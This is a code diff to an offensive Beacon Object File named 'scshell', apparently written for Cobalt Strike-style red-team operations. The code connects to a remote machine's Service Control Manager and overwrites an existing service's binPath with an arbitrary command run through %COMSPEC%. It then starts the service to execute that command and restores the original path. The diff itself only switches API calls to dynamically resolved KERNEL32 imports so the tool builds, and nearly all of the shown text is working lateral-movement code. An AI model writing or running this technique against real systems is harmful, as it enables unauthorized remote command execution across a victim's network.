@@ -26,6 +26,9 @@ DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ChangeServiceConfigW(
 DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$StartServiceW(SC_HANDLE, DWORD, LPCWSTR*);
 DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
 
+DECLSPEC_IMPORT int   WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
+DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
+
 DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
 DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t);
 DECLSPEC_IMPORT void  __cdecl MSVCRT$free(void*);
@@ -48,12 +51,12 @@ void go(char *args, int args_len) {
     wchar_t wTarget[256] = {0};
     wchar_t wService[256] = {0};
     wchar_t wCommand[4096] = {0};
-    MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, 256);
-    MultiByteToWideChar(CP_UTF8, 0, service, -1, wService, 256);
+    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, 256);
+    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, service, -1, wService, 256);
 
     /* Wrap command: %COMSPEC% /C "command" */
     wchar_t wCmd[2048] = {0};
-    MultiByteToWideChar(CP_UTF8, 0, command, -1, wCmd, 2048);
+    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, command, -1, wCmd, 2048);
     MSVCRT$swprintf(wCommand, 4096, L"%%COMSPEC%% /C \"%s\"", wCmd);
 
     BeaconPrintf(CALLBACK_OUTPUT, "[*] scshell: hijacking '%s' on \\\\%s\n",
@@ -62,7 +65,7 @@ void go(char *args, int args_len) {
     /* Step 1: Open remote SCM */
     SC_HANDLE hSCM = ADVAPI32$OpenSCManagerW(wTarget, NULL, SC_MANAGER_CONNECT);
     if (!hSCM) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] OpenSCManagerW failed: %lu\n", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[!] OpenSCManagerW failed: %lu\n", KERNEL32$GetLastError());
         return;
     }
 
@@ -72,7 +75,7 @@ void go(char *args, int args_len) {
         SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START);
     if (!hSvc) {
         BeaconPrintf(CALLBACK_ERROR, "[!] OpenServiceW('%s') failed: %lu\n",
-                     service, GetLastError());
+                     service, KERNEL32$GetLastError());
         ADVAPI32$CloseServiceHandle(hSCM);
         return;
     }
@@ -92,7 +95,7 @@ void go(char *args, int args_len) {
 
     if (!ADVAPI32$QueryServiceConfigW(hSvc, origConfig, bytesNeeded, &bytesNeeded)) {
         BeaconPrintf(CALLBACK_ERROR, "[!] QueryServiceConfigW failed: %lu\n",
-                     GetLastError());
+                     KERNEL32$GetLastError());
         MSVCRT$free(origConfig);
         ADVAPI32$CloseServiceHandle(hSvc);
         ADVAPI32$CloseServiceHandle(hSCM);
@@ -111,7 +114,7 @@ void go(char *args, int args_len) {
             NULL, NULL, NULL, NULL, NULL, NULL))
     {
         BeaconPrintf(CALLBACK_ERROR, "[!] ChangeServiceConfigW (set) failed: %lu\n",
-                     GetLastError());
+                     KERNEL32$GetLastError());
         MSVCRT$free(origConfig);
         ADVAPI32$CloseServiceHandle(hSvc);
         ADVAPI32$CloseServiceHandle(hSCM);
@@ -123,7 +126,7 @@ void go(char *args, int args_len) {
     /* Step 5: Start service — executes our command */
     BOOL started = ADVAPI32$StartServiceW(hSvc, 0, NULL);
     if (!started) {
-        DWORD err = GetLastError();
+        DWORD err = KERNEL32$GetLastError();
         if (err == 1053) {
             BeaconPrintf(CALLBACK_OUTPUT,
                 "[+] Command executed (service timeout expected)\n");
@@ -147,7 +150,7 @@ void go(char *args, int args_len) {
     {
         BeaconPrintf(CALLBACK_ERROR,
             "[!] ChangeServiceConfigW (restore) failed: %lu — MANUAL RESTORE NEEDED\n",
-            GetLastError());
+            KERNEL32$GetLastError());
     } else {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Original binPath restored\n");
     }
